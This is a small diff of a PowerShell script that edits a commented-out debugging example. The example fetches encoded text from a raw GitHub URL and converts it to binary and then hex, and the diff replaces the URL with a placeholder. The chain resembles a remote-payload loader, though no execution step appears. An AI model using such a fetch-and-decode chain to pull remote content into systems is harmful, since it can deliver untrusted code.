@@ -89,7 +89,7 @@ Function Cleanup {
 
 # Script Execution Example (Uncomment as needed for debugging)
 
-# $url = "https://raw.githubusercontent.com/1/1/main/8.txt"
+# $url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt"
 # $rawText = FetchTextFromURL -url $url
 # $binaryString = Convert-EncodedStringToBinary -encodedString $rawText
 # $hexString = Convert-BinaryToHex -binaryString $binaryString
